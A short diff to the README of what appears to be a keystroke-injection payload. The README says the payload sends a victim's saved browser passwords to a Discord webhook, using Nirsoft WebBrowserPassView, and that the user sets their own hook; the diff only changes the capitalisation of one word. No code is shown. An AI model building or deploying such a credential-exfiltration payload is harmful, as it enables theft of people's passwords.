@@ -3,7 +3,7 @@
 This payload exfills user browser password to Discord.
 
 You must edit the following parameters on the payload:
-* hook - your Discord hook
+* Hook - your Discord hook
 
 It uses [Nirsoft](https://www.nirsoft.net/utils/web_browser_password.html) WebBrowserPassView
 
